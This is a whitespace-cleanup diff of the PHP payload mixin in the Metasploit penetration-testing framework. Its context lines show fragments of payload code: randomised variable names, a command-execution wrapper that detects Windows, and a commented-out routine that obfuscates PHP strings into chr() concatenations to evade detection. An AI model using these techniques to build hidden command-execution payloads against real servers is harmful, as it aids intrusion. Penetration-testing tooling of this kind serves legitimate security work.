@@ -1,14 +1,14 @@
 require 'msf/core'
 
 ###
-# 
+#
 ###
 module Msf::Payload::Php
 
 	def initialize(info = {})
 		super(info)
 	end
-	
+
 	def php_preamble(options = {})
 		dis = options[:disabled_varname] || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
 		dis = '$' + dis if (dis[0,1] != '$')
@@ -46,7 +46,7 @@ module Msf::Payload::Php
 
 		is_callable = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
 		in_array    = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
-		
+
 		setup = "
 			if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
 				#{cmd}=#{cmd}.\" 2>&1\\n\";
@@ -120,8 +120,8 @@ module Msf::Payload::Php
 		###
 		# All of this junk should go in an encoder
 		#
-		# Replace all single-quoted strings with quoteless equivalents, e.g.: 
-		#    echo('asdf'); 
+		# Replace all single-quoted strings with quoteless equivalents, e.g.:
+		#    echo('asdf');
 		# becomes
 		#    echo($a.$s.$d.$f);
 		# and add "$a=chr(97);" et al to the top of the block
@@ -137,7 +137,7 @@ module Msf::Payload::Php
 		#	$1.each_byte { |c|
 		#		if (('a'..'z').include?(c.chr))
 		#			alpha_used[c] = 1
-		#			str_array << "$#{c.chr}." 
+		#			str_array << "$#{c.chr}."
 		#		else
 		#			str_array << "chr(#{c})."
 		#		end
@@ -147,7 +147,7 @@ module Msf::Payload::Php
 		#}
 		#if (alpha_used.length > 1)
 		#	alpha_used.each_key { |k| buf = "$#{k.chr}=chr(#{k});" + buf }
-		#end 
+		#end
 		#
 		#buf.gsub!(/\s*/, '')
 		#
